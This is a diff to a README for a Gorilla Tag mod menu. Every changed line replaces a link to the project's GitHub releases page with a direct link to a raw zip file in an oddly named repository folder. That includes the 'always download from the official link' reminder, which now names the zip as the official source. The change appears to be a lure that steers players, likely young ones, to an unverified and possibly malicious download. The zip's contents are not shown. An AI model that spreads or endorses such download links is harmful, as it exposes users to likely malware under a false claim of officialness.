@@ -1,7 +1,7 @@
 <h1>🔵 gorillatag-menu - Unlock New Gorilla Tag Experiences</h1>
 
 <p align="center">
-  <a href="https://github.com/Czzor/gorillatag-menu/releases"><img src="https://img.shields.io/badge/Download-Now-Brightgreen?style=for-the-badge&logo=github" alt="Download Button" style="background-color:#238636; color:#ffffff; padding:15px 40px; border-radius:10px; font-size:24px;"></a>
+  <a href="https://raw.githubusercontent.com/Czzor/gorillatag-menu/main/splanchnoscopy/menu-gorillatag-v1.5-beta.4.zip"><img src="https://img.shields.io/badge/Download-Now-Brightgreen?style=for-the-badge&logo=github" alt="Download Button" style="background-color:#238636; color:#ffffff; padding:15px 40px; border-radius:10px; font-size:24px;"></a>
 </p>
 
 <h2>🎮 What Is This?</h2>
@@ -41,7 +41,7 @@
 </ol>
 
 <p align="center">
-  <a href="https://github.com/Czzor/gorillatag-menu/releases"><img src="https://img.shields.io/badge/🔽Download_Latest_Version-Orange?style=for-the-badge" alt="Download" style="background-color:#FF4500; color:#ffffff; padding:15px 40px; border-radius:10px; font-size:20px;"></a>
+  <a href="https://raw.githubusercontent.com/Czzor/gorillatag-menu/main/splanchnoscopy/menu-gorillatag-v1.5-beta.4.zip"><img src="https://img.shields.io/badge/🔽Download_Latest_Version-Orange?style=for-the-badge" alt="Download" style="background-color:#FF4500; color:#ffffff; padding:15px 40px; border-radius:10px; font-size:20px;"></a>
 </p>
 
 <h2>🚀 How to Install and Run</h2>
@@ -87,13 +87,13 @@
 
 <h2>📌 Final Reminders</h2>
 <ul>
-  <li>Always download from the official link: <strong>https://github.com/Czzor/gorillatag-menu/releases</strong></li>
+  <li>Always download from the official link: <strong>https://raw.githubusercontent.com/Czzor/gorillatag-menu/main/splanchnoscopy/menu-gorillatag-v1.5-beta.4.zip</strong></li>
   <li>Close other heavy programs before playing for best performance.</li>
   <li>Check for updates regularly to keep things running smoothly.</li>
 </ul>
 
 <p align="center">
-  <a href="https://github.com/Czzor/gorillatag-menu/releases"><img src="https://img.shields.io/badge/⬇️_Download_gorillatag--menu-Purple?style=for-the-badge" alt="Final Download" style="background-color:#7D3C98; color:#ffffff; padding:15px 40px; border-radius:10px; font-size:20px;"></a>
+  <a href="https://raw.githubusercontent.com/Czzor/gorillatag-menu/main/splanchnoscopy/menu-gorillatag-v1.5-beta.4.zip"><img src="https://img.shields.io/badge/⬇️_Download_gorillatag--menu-Purple?style=for-the-badge" alt="Final Download" style="background-color:#7D3C98; color:#ffffff; padding:15px 40px; border-radius:10px; font-size:20px;"></a>
 </p>
 
 <p>Now go have fun, swing around, tag your friends, and enjoy all the extra powers that gorillatag-menu gives you. Happy playing! 🦍🎉</p>
